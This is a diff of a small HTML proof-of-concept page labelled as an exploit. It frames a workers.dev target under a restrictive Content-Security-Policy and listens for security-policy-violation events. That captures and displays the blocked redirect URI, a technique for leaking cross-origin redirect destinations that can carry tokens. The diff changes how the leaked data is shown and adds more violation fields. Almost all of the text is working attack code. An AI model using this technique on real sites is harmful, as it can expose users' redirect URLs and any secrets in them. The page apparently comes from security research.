@@ -5,32 +5,33 @@
     <meta charset="UTF-8">
     <meta http-equiv="Content-Security-Policy"
         content="default-src 'self' 'unsafe-inline'; frame-src https://summer-waterfall-d973.utaa1009.workers.dev;">
-    <title>Iframe Redirect Leak PoC</title>
+    <title>utaa - poc</title>
 </head>
-
 <body>
-
     <h3>target: https://summer-waterfall-d973.utaa1009.workers.dev/</h3>
     <button id="exploitBtn">Run Exploit</button>
-    <p id="status" style="word-break: break-all;">Status: Waiting...</p>
+    <div id="status" style="white-space: pre; font-family: monospace; margin-top: 20px;"></div>
     <div id="frameContainer"></div>
-
     <script>
         const statusDiv = document.getElementById('status');
         document.addEventListener('securitypolicyviolation', (e) => {
-            statusDiv.innerHTML = `<br><b style="color:red; font-size:18px;">
-            LEAKED URI:<br>${e.blockedURI}
-        </b>`;
-            alert("FULL EVENT OBJECT:", e);
+            const violationData = {
+                blockedURI: e.blockedURI,
+                violatedDirective: e.violatedDirective,
+                originalPolicy: e.originalPolicy,
+                disposition: e.disposition,
+                statusCode: e.statusCode,
+                effectiveDirective: e.effectiveDirective
+            };
+            statusDiv.textContent = JSON.stringify(violationData, null, 2);
         });
 
         document.getElementById('exploitBtn').addEventListener('click', () => {
-            statusDiv.innerHTML = "Injecting iframe...";
+            statusDiv.textContent = "Injecting iframe...";
             const iframe = document.createElement('iframe');
             iframe.src = "https://summer-waterfall-d973.utaa1009.workers.dev/";
             iframe.style.width = "100%";
             iframe.style.height = "100px";
-            iframe.style.border = "1px solid black";
             document.getElementById('frameContainer').appendChild(iframe);
         });
     </script>
